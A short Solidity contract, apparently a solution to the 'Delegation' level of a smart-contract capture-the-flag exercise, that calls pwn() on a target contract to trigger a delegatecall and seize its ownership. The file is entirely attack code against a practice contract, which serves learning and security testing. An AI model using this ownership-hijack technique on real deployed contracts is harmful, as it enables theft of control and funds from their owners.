// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public delegation;

    constructor(address _delegation) {
        delegation = _delegation;
    }

    function hackContract() external {
        delegation.call(abi.encodeWithSignature("pwn()"));
    }
}
